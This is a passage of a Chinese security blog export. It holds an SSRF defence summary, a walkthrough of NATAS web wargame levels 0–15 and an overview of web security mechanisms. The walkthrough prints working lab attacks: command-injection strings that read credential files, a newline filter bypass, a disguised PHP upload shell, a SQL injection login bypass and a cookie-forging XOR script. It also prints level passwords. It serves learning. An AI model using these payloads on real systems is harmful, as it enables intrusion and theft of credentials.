<p>主要原因在于服务器对用户提供的URL或调用远程服务器的返回信息没有进行验证及过滤，导致传入服务器的数据可能存在其他非正常行为。而且这类非正常行为会被执行和回显。</p>
<p>针对这类情况，有效的防护手段包括：</p>
<p>1）双向过滤用户端参数，严格限定输入参数、返回结果的数据类型及内容。</p>
<p>2）限制请求行为端口，并针对具有服务器请求业务的网络范围进行严格划分。</p>
<p>3）针对内网地址添加黑\白名单，参考以上实例。</p>
<p>4）尽可能实现业务集中化调用，并尽量减少这类直接发起主动请求的业务行为。</p>
<p>针对SSRF漏洞防护，最合理的措施是从开发阶段就针对服务器的主动请求行为进行统一规划及防护，从而有效解决上述问题。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>csrf</category>
        <category>ssrf</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>csrf</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>NATAS</title>
    <url>/2023/05/14/NATAS/</url>
    <content><![CDATA[<h2 id="NATAS-0"><a href="#NATAS-0" class="headerlink" title="NATAS 0"></a>NATAS 0</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141731305.png" alt="image-20230516141731305"></p>
<p>查看源代码页面。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141801967.png" alt="image-20230516141801967"></p>
<p>g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</p>
<h2 id="NATAS-1"><a href="#NATAS-1" class="headerlink" title="NATAS 1"></a>NATAS 1</h2><p>You can find the password for the next level on this page, but rightclicking has been blocked! </p>
<p>右键菜单用不了，直接url栏添加view-source:</p>
<p>h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</p>
<h2 id="NATAS-2-路径"><a href="#NATAS-2-路径" class="headerlink" title="NATAS 2(路径)"></a>NATAS 2(路径)</h2><p>There is nothing on this page </p>
<p>右键菜单得</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516142055627.png" alt="image-20230516142055627"></p>
<p>这么小一个点，让我想到了图片宽高比</p>
<p>打开winhex，发现就是png，好吧，没用</p>
<p>f12查看网络嘞，发现了base64编码，解码后发现是第二关的密码，没用</p>
<p>看了wp才知道，&#x2F;files试试，查看路径</p>
<p><code>http://natas2.natas.labs.overthewire.org/files</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/20230516152928.png" alt="index"></p>
<h2 id="NATAS-3-robots-txt"><a href="#NATAS-3-robots-txt" class="headerlink" title="NATAS 3(robots.txt)"></a>NATAS 3(robots.txt)</h2><p>There is nothing on this page</p>
<p>查看源代码后</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516180626251.png" alt="image-20230516180626251"></p>
<p>好像确实没东西诶。</p>
<p>看了wp，提示说搜索引擎的话，看robots.txt</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516182801703.png" alt="image-20230516182801703"></p>
<p>路径 &#x2F;s3cr3t&#x2F;</p>
<p>输入下，给了user.txt，点击查看得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</span><br></pre></td></tr></table></figure>

<h2 id="NATAS-4-Referer注入"><a href="#NATAS-4-Referer注入" class="headerlink" title="NATAS 4(Referer注入)"></a>NATAS 4(Referer注入)</h2><p><img src="/../../../Typora/img111/image-20230516182950328.png" alt="image-20230516182950328"></p>
<p>说是没权限，考虑要bp，右键链接，抓包后把referer改一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183538845.png" alt="image-20230516183538845"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183557188.png" alt="image-20230516183557188"></p>
<p>Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</p>
<h2 id="NATAS-5-Cookie注入"><a href="#NATAS-5-Cookie注入" class="headerlink" title="NATAS 5(Cookie注入)"></a>NATAS 5(Cookie注入)</h2><p>Access disallowed. You are not logged in</p>
<p>查看源代码，没有。</p>
<p>直接抓包吧</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183915010.png" alt="image-20230516183915010"></p>
<p>Cookie处为0，改为1试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183943554.png" alt="image-20230516183943554"></p>
<h2 id="NATAS-6-php代码审计"><a href="#NATAS-6-php代码审计" class="headerlink" title="NATAS 6 (php代码审计)"></a>NATAS 6 (php代码审计)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516184055751.png" alt="image-20230516184055751"></p>
<p>看下源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516184111016.png" alt="image-20230516184111016"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_key_exists ( mixed $key , array $array ) : bool</span><br></pre></td></tr></table></figure>

<p>检查数组中是否存在指定键名。</p>
<p>我们看路径为，includes&#x2F;secret.inc</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194213702.png" alt="image-20230516194213702"></p>
<p>也就是说输入的值要和该路径值是相同的</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194332011.png" alt="image-20230516194332011"></p>
<h2 id="NATAS-7-任意命令执行"><a href="#NATAS-7-任意命令执行" class="headerlink" title="NATAS 7 (任意命令执行)"></a>NATAS 7 (任意命令执行)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194441515.png" alt="natas7页面"></p>
<p>点击之后出现效果</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194519670.png" alt="natas7的home页面"></p>
<p>查看源代码提示了密码位置</p>
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516202112882.png" alt="image-20230516202112882"></p>
<h2 id="NATAS-8-php代码审计"><a href="#NATAS-8-php代码审计" class="headerlink" title="NATAS 8 (php代码审计)"></a>NATAS 8 (php代码审计)</h2><p>和NATAS 6一样的页面，我们看源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516202232789.png" alt="NATAS 8源代码"></p>
<p>分析代码可知，输入框中的值经过encodeSecret()函数处理后的值与上述3d…相等即可</p>
<p>先base64_encode，再strrev(逆置)，再bin2hex(ASCII字符串转化为16进制)</p>
<p><code>hex2bin(hexString)</code>的作用是将字符串作为<code>十六进制</code>的模式进行处理，”68656c6c6f”<code>会被处理成</code>“68” “65” “6c” “6c” “6f”<code>，然后转换成对应的二进制数值，</code>“68”（注意是字符串 2bytes）<code>转为二进制数值是 </code>01101000（注意是数值 1byte）<code>，输出至终端其实就是</code>h（1bytes）<code>的，依次处理后，我们成功的将</code>10bytes<code>的字符串</code>“68656c6c6f”<code>转换成了</code>5bytes<code>的字符串</code>“hello”&#96;</p>
<p><code>bin2hex(binString)</code>则是将待处理的数据的<code>二进制bit串</code>进行<code>16进制</code>转换，并返回相应的<code>16进制形式的字符串</code>，这里的<code>bin</code>是说会将其作为二进制流，转换成对应的十六进制流，然后再以对应的字符串方式返回。比如<code>&quot;h&quot;</code>的<code>二进制bit串</code>是<code>01101000</code>，对应的十六进制是 <code>0x68</code>，相应的字符串形式是<code>&quot;68&quot;</code>，依次继续解包处理 <code>&quot;e&quot; &quot;l&quot; &quot;l&quot; &quot;o&quot;</code> 后得到的字符串就是<code>&quot;68656c6c6f&quot;</code>。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204322265.png" alt="image-20230516204322265"></p>
<p>参考：<a href="https://blog.csdn.net/weixin_33896726/article/details/91966490"> hex2bin &#x2F; bin2hex &#x2F; pack &#x2F; unpack 的理解及应用_weixin_33896726的博客-CSDN博客</a></p>
<p>那么进行相反操作，先hex2bin()-&gt;strrev-&gt;base64_decode</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204429541.png" alt="image-20230516204429541"></p>
<p>输入框提交oubWYf2kBq即可。</p>
<h2 id="NATAS-9-RCE"><a href="#NATAS-9-RCE" class="headerlink" title="NATAS 9 (RCE)"></a>NATAS 9 (RCE)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204620916.png" alt="image-20230516204620916"></p>
<p>先看源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204642815.png" alt="image-20230516204642815"></p>
<p><em>passthru</em>() 允许您运行外部程序，并在屏幕上显示结果。不需要使用 echo 或 return 来查看结果</p>
<p>上述代码应该是如果key不为空，就去在dictionary.txt去找含key的行</p>
<p>grep，linux中的文本匹配命令, -i 不区分大小写地搜索</p>
<p>看看txt文件内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516205145633.png" alt="image-20230516205145633"></p>
<p>嘶，有什么意义嘞。</p>
<p>看了wp说是，已知grep，应该联想到<strong>命令注入漏洞</strong>，又已知&#x2F;etc&#x2F;natas_webpass目录下存放着各级命令。截断grep命令即可。</p>
<p><code>;cat /etc/natas_webpass/natas10 #</code></p>
<p>;用于截断前面的grep -i，#用于注释后面的dictionary.txt</p>
<h2 id="NATAS-10-RCE"><a href="#NATAS-10-RCE" class="headerlink" title="NATAS 10 (RCE)"></a>NATAS 10 (RCE)</h2><p>在NATAS 9的基础上，For security reasons, we now filter on certain characters，过滤了一些特定字符</p>
<p>源代码可以看出</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516214122214.png" alt="image-20230516214122214"></p>
<p>过滤了常见符 &amp;、|、;</p>
<p>哦豁，那咋办。</p>
<p>可用**%0a、%0d代替**。</p>
<p><code>%0a cat /etc/natas_webpass/natas11#</code></p>
<p>输入框输入提交时，无显示；</p>
<p><strong>直接在url处输入。</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516215849290.png" alt="image-20230516215849290"></p>
<p>参考：命令注入的各种绕过：<a href="https://blog.csdn.net/qq_41497476/article/details/107042961?ops_request_misc=%7B%22request_id%22:%22168424518616800215084685%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168424518616800215084685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-107042961-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=;%7C&%5D%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">CTFhub RCE 命令注入部分_qq_41497476的博客-CSDN博客</a></p>
<h2 id="NATAS-11-php代码审计、异或逆推、修改Cookie"><a href="#NATAS-11-php代码审计、异或逆推、修改Cookie" class="headerlink" title="NATAS 11 (php代码审计、异或逆推、修改Cookie)"></a>NATAS 11 (php代码审计、异或逆推、修改Cookie)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516220039092.png" alt="natas11页面"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line">if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123;`</span><br><span class="line">  `print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先从最后的代码分析，如果$data[“showpassword”] &#x3D;&#x3D; “yes”，即可得到密码。showpassword是什么？</p>
<p>原始的数据是个数组，有两部分，它的showpassword部分是no。</p>
<p>看$data怎么得到哈，从最后看起，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123;</span><br><span class="line">  if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">    $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br></pre></td></tr></table></figure>



<p>这一段就是页面上，点击按钮，就设置颜色那一块。</p>
<p>看一下loadData()、saveData()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function loadData($def) &#123;</span><br><span class="line">  global $_COOKIE;</span><br><span class="line">  $mydata = $def;#输入的值</span><br><span class="line">  if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">  $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);#将cookie先base64解码，再异或后json解码才与输入值是同类型</span><br><span class="line"> </span><br><span class="line">  if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">    $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;];</span><br><span class="line">    $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $mydata;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个作用应该是将原始数组解密，存成mydata数组</p>
<p><code>function saveData($d) &#123;   setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</code><br><code>&#125;</code></p>
<p>将编码后的值存到_COOKIE[“data”]中。</p>
<p>xor_encrypt()函数内容为</p>
<pre><code>function xor_encrypt($in) &#123;
    $key = &#39;&lt;censored&gt;&#39;;#键值
    $text = $in;#输入值
    $outText = &#39;&#39;;
// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) &#123;
$outText .= $text[$i] ^ $key[$i % strlen($key)];
&#125;

return $outText;#新值
&#125;
</code></pre>
<p>综上，xor..函数的输入值是将原cookie经过base64_decode的值</p>
<p>思路为：原始data 异或 key&#x3D;加密data</p>
<p>​				原始data 异或 加密data&#x3D;key</p>
<p>​				之后再构造新data，即(…&#x3D;“yes”)，用得到的key加密，存回cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始data为array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br></pre></td></tr></table></figure>

<p>通过f12网络可知data</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516230016557.png" alt="image-20230516230016557"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密data为MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qe354bjY%3D</span><br></pre></td></tr></table></figure>

<p>异或俩data，得到key</p>
<p>得到的值有点怪</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=base64_decode(&quot;MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qe354bjY%3D&quot;);</span><br><span class="line">	function xor_encrypt($in) &#123;</span><br><span class="line">		$key =json_encode(array(&quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;));</span><br><span class="line">		$text = $in;</span><br><span class="line">		$outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">		// Iterate through each character</span><br><span class="line">		for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">		$outText .= $text[$i]^ $key[$i % strlen($key)];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $outText;</span><br><span class="line">	&#125;</span><br><span class="line">echo xor_encrypt($data);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516234336935.png" alt="image-20230516234336935"></p>
<p>这三个框emmm</p>
<p><strong>所以key&#x3D;KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLLKL</strong></p>
<p>我这里出现了问题，key是它的话，不成功，但是看大佬的wp，是只取了前4位的，所以我也取前4位试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">	function xor_encrypt($in) &#123;</span><br><span class="line">		$key =&#x27;KNHL&#x27;;</span><br><span class="line">		$text = $in;</span><br><span class="line">		$outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">		// Iterate through each character</span><br><span class="line">		for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">		$outText .= $text[$i]^ $key[$i % strlen($key)];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $outText;</span><br><span class="line">	&#125;</span><br><span class="line">echo base64_encode(xor_encrypt(json_encode($data)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz这就是新cookie了，用bp进行POST时，Cookie换上它。其实也可以f12控制台里document.cookie进行设置</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516235350410.png" alt="image-20230516235350410"></p>
<p>YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</p>
<p>参考：<a href="https://blog.csdn.net/M110K/article/details/112486709?ops_request_misc=%7B%22request_id%22:%22168424913616800182177459%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168424913616800182177459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-112486709-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=natas11&spm=1018.2226.3001.4187">(8WarGame系列之Natas(Web安全)通关指北(中级篇11-20) 详细版_KEY0NE的博客-CSDN博客</a></p>
<h2 id="NATAS-12-文件上传-任意文件"><a href="#NATAS-12-文件上传-任意文件" class="headerlink" title="NATAS 12(文件上传-任意文件)"></a>NATAS 12(文件上传-任意文件)</h2><p>效果是上传的文件都会被改名，且后缀改为jpg。而文件上传木马只有php时才有效果。</p>
<p>抓包，改后缀为php</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517111546504.png" alt="image-20230517111546504"></p>
<p>用蚁剑连接的方式貌似失败诶，那就改成如下内容：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517112515856.png" alt="image-20230517112515856"></p>
<p>上传成功后，点击链接就可以</p>
<p>lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</p>
<h2 id="NATAS-13-文件上传-仅图像文件"><a href="#NATAS-13-文件上传-仅图像文件" class="headerlink" title="NATAS 13(文件上传-仅图像文件)"></a>NATAS 13(文件上传-仅图像文件)</h2><p>在NATAS 12的基础上，有For security reasons, we now only accept image files!</p>
<p>改后缀绕过都不行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if (! exif_imagetype($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">    echo &quot;File is not an image&quot;;</span><br></pre></td></tr></table></figure>

<p><code>exif_imagetype()</code> 来验证文件类型，</p>
<p>那么在文件开头加上GIF98a.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(&#x27;cat /etc/natas_webpass/natas14&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517115603042.png" alt="image-20230517115603042"></p>
<p>qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</p>
<h2 id="NATAS-14（登陆页面）"><a href="#NATAS-14（登陆页面）" class="headerlink" title="NATAS 14（登陆页面）"></a>NATAS 14（登陆页面）</h2><p>登陆页面，随便输入账号密码，提交后出现，权限拒绝</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230518140929790.png" alt="image-20230518140929790"></p>
<p>直接将Sql语句拼接，存在sql注入</p>
<p><code>username=123&quot; or 1=1#&amp;password=123&quot;</code></p>
<p>#之后是注释掉了</p>
<p>原sql语句会变成：</p>
<p><code>SELECT * from users where username=&quot;123&quot; or 1=1#</code></p>
<p>即条件始终为真。</p>
<p>Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</p>
<h2 id="NATAS-15-输入框提交"><a href="#NATAS-15-输入框提交" class="headerlink" title="NATAS 15 (输入框提交)"></a>NATAS 15 (输入框提交)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysqli_connect(&#x27;localhost&#x27;, &#x27;natas15&#x27;, &#x27;&lt;censored&gt;&#x27;);</span><br><span class="line">    mysqli_select_db($link, &#x27;natas15&#x27;);</span><br><span class="line"></span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($link, $query);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysqli_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        echo &quot;This user exists.&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error in query.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysqli_query(link,query)在数据库中执行一条sql语句</p>
<p>link指建立的连接，query查询字符串</p>
<p>看了wp，说是盲注。</p>
<p>。。。。。。。。</p>
<p>它应该会对内容进行检测，试试图片码</p>
<p><code>copy mm.php/a+a.jpg/b 3.jpg</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517114223870.png" alt="image-20230517114223870"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>web</tag>
        <tag>NATAS</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全防护体系</title>
    <url>/2023/06/13/Web%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="1-Web安全核心问题"><a href="#1-Web安全核心问题" class="headerlink" title="1.Web安全核心问题"></a>1.Web安全核心问题</h1><p>安全的核心问题是：用户可以提交任意输入，但从安全角度而言，用户所有输入均不可信。</p>
<p>1）用户侧可<strong>直接修改</strong>浏览器与服务器间<strong>传送的数据结构及内容</strong>。其中包括请求参数、Cookie内容和http消息头等方面。可轻易避开客户端执行的任何安全检测脚本，如各类型验证。</p>
<p>2）用户侧可在任意环节及功能上<strong>多次重复提交</strong>，并且服务器均会对重复提交的内容按照<strong>同一种逻辑进行处理</strong>，这样给攻击者实现爆破攻击的机会。</p>
<p>3）用户侧可利用浏览器、相关插件、攻击组件等多重方式<strong>对服务器进行探测</strong>，并且服务器没有有效手段控制用户侧所采用的工具类型。</p>
<p>4）部分业务逻辑依靠用户输入的参数进行业务开展，如显示用户名、用户自有信息等，从而增加了用户与系统的<strong>交互点</strong>。</p>
<h1 id="2-实际问题的客观引发因素"><a href="#2-实际问题的客观引发因素" class="headerlink" title="2.实际问题的客观引发因素"></a>2.实际问题的客观引发因素</h1><p>1）不健全的安全开发体系。</p>
<p>2）开发周期的缩短及功能频繁变更。</p>
<p>3）开发人员的不稳定性。</p>
<p>4）运维人员的安全意识不足。</p>
<h1 id="3-建立基本的安全框架"><a href="#3-建立基本的安全框架" class="headerlink" title="3.建立基本的安全框架"></a>3.建立基本的安全框架</h1><p>攻击者会利用各种具有服务器<strong>交互</strong>的业务功能进行各类攻击尝试，这也是Web漏洞存在的基本特点。因此在安全框架设计上，需重点关注Web应用与用户交互的方式及对应的业务流程。而且，要设计合理的用户交互规范，并对任何不应被信任的数据进行统一的过滤。</p>
<h2 id="3-1-处理用户交互权限"><a href="#3-1-处理用户交互权限" class="headerlink" title="3.1 处理用户交互权限"></a>3.1 处理用户交互权限</h2><p>在这个过程中，<strong>要具备完整的用户访问行为处理与过滤功能。</strong>通常情况下，可根据用户的<strong>交互行为进行分类</strong>，同时结合用户的<strong>身份权限</strong>进行综合处理，如常见的匿名用户、正常通过验证的用户和管理用户权限。许多情况下，不同用户只允许访问不同的数据，例如各类用户隐私数据、订单信息等内容。</p>
<p>目前，主流的Web应用使用三层相互关联的安全机制来处理用户访问。</p>
<p><strong>（1）用户身份验证方式</strong></p>
<blockquote>
<p>身份验证机制是Web应用识别用户身份的基本机制，如用户登录功能、利用OAuth授权功能等。在这个过程中，Web应用会重点验证用户的真实身份。如果不采用这类机制，应用程序应将所有用户作为匿名用户对待。目前，大多数Web应用程序采用标准的身份验证模型，即要求用户提交用户名和密码，再由应用程序对其进行核实，确认其合法性。</p>
</blockquote>
<p><strong>（2）用户会话管理</strong></p>
<blockquote>
<p>当用户通过了Web应用的身份验证方式后，用户可访问当前Web应用并使用对应的功能。在这个过程中，Web应用会收到不同用户发出的访问请求。这期间<strong>Web应用需识别并处理每一名用户提交的各种请求</strong>，并根据用户的身份权限实施有效的访问控制，实现管理用户的会话的功能。</p>
</blockquote>
<p>为了实现用户会话管理功能(<em><strong>跟踪用户并保持用户信息的技术</strong></em>)，Web应用在用户身份验证通过后会为每一个用户建立一个<strong>独立的Session</strong>，并向用户生成一个具有标识功能的<strong>令牌</strong>。<strong>Session本身是一组保存在服务器上的数据结构，用于追踪用户与Web应用的交互状态。</strong>这个过程中，Web应用会利用Cookie与Session机制来实现上述功能。</p>
<p><strong>（3）用户访问行为控制</strong></p>
<blockquote>
<p>Web应用需要对每个用户访问的访问请求做出响应。当前两个安全机制运作正常时，Web应用在接收到用户请求后会根据当前用户的身份状态及权限以及业务流程要求来决定响应或拒绝当前的请求。在此基础上，应用程序需要决定是否<strong>授权</strong>用户执行其所请求的操作或访问相关数据。</p>
</blockquote>
<h2 id="3-2处理用户输入参数"><a href="#3-2处理用户输入参数" class="headerlink" title="3.2处理用户输入参数"></a>3.2处理用户输入参数</h2><p>在用户输入参数的处理方面，有以下几个方式可供选择：</p>
<p>（1）利用黑名单过滤用户非法输入参数</p>
<blockquote>
<p>Web应用会使用一个<strong>黑名单</strong>来对用户输入的参数进行过滤。黑名单中包含一组在攻击中使用过的已知的字符串或特征。Web应用需阻止任何与黑名单匹配的数据进入，并对不符合黑名单的用户输入参数进行处理。</p>
</blockquote>
<p>（2）利用白名单校验用户参数是否为正常输入参数</p>
<blockquote>
<p>白名单是一种非常好的用户参数规范校验机制，相对于黑名单来说其过滤效果更加严格。因此<strong>适用于各类对参数格式及内容有着明确要求的业务场景</strong>。Web应用会将接收到的用户参数与白名单定义的规范进行匹配，并在匹配成功后执行后续业务流程。</p>
</blockquote>
<p>（3）使用安全的数据方式</p>
<blockquote>
<p>以不安全的方式处理用户提交的数据，容易造成Web应用错误地将用户输入参数作为代码执行，是许多Web应用程序漏洞形成的根本原因。在这种状况下，通常不需要确认输入本身的合法性，只要确保处理过程绝对安全，即可避免出现各类漏洞。例如，<strong>在数据库访问过程中使用参数化查询方式</strong>，即可避免绝大部分SQL注入攻击。</p>
</blockquote>
<p>（4）用户行为参数检查</p>
<blockquote>
<p>在一些业务流程漏洞中，攻击者提交的输入参数与普通的非恶意用户提交的输入参数完全相同，这就会导致上述三种防护手段均会失效。这类行为是因为攻击者提交参数时的目的不同。例如，攻击者可能会修改Web页面隐藏表单字段提交的参数，如订单编号，企图利用修改订单编号来实现访问行为越权。</p>
<p>因此，<strong>要在后台对用户的输入参数根据业务要求进行二次校验</strong>，方可避免这类问题的出现。</p>
</blockquote>
